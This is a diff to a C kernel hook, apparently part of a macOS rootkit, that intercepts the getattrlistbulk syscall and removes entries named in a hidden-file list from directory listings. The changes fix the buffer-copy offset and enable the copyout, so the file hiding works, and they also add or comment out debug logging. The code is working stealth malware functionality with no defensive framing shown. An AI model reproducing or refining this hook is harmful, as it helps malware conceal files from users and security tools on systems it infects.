@@ -313,6 +313,7 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
     int num_of_file=*retval;
     for(int file_num=0; file_num<num_of_file && attr_data_size>0 && remain_data_size>0 && *retval>0; file_num++)
     {
+        LOG(LOG_ERROR, "Th total file number is %d, current is %d", num_of_file, file_num);
         void* attr_data_tmp_address=base_attr_data_addr;
 
         attr_data=attr_data_tmp_address;    //get the address
@@ -347,7 +348,7 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
                 int is_find=0;
                 TAILQ_FOREACH_SAFE(var, &hide_file_dirent_array, next_ptr, tvar)
                 {
-                    LOG(LOG_ERROR, "hide name %s", var->name);
+                    //LOG(LOG_ERROR, "hide name %s", var->name);
                     if(strcmp(attr_data->name, var->name)==0)   //if find name, just hide it.
                     {
                         is_find=1;
@@ -355,7 +356,8 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
                         attr_data_size-=attr_data->length;
                         *retval-=1;
                         LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
-                        bcopy((char*)attr_data+attr_data->length, (char*)attr_data,remain_data_size);
+                        //__asm("int3");
+                        bcopy((char*)base_attr_data_addr+attr_data->length, (char*)base_attr_data_addr,remain_data_size);
                     }
                 }
                 if(is_find) continue;
@@ -365,8 +367,10 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
         base_attr_data_addr+=attr_data->length;
         LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
     }
-//    copyout(base_attr_data_addr, uap->attributeBuffer, attr_data_size);
-//    uap->bufferSize=attr_data_size;
+//    __asm("int3");
+    copyout(base_attr_data_addr, uap->attributeBuffer, attr_data_size);
+//    __asm("int3");
+    uap->bufferSize=attr_data_size;
 
 clean:
     if(attr_data_address!=NULL) SAFE_FREE(attr_data_address);
